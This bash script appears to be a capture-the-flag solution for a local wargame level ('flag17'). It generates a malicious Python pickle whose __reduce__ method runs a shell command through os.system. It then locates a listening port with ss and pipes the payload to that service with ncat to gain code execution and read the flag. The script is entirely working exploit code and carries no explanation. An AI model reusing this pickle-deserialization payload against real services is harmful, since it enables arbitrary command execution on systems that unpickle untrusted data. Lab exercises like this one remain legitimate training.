#!/usr/bin/env bash

cat >/tmp/flag17.py <<EOF
#!/usr/bin/env python3

import os
import pickle

class GetFlag(object):
    def __reduce__(self):
        return (os.system,("getflag >/tmp/flag17",))

with open("/dev/stdout", "wb") as pkl:
    pickle.dump(GetFlag(), pkl, pickle.HIGHEST_PROTOCOL)
EOF
chmod u=rwx,go=- /tmp/flag17.py

port="$(ss -ant | awk '/LISTEN.+:170/ {print $4}')"
/tmp/flag17.py | ncat --send-only 127.0.0.1 "${port##*:}"

[[ ! -f /tmp/flag17 ]] || cat /tmp/flag17
rm -f /tmp/flag17*
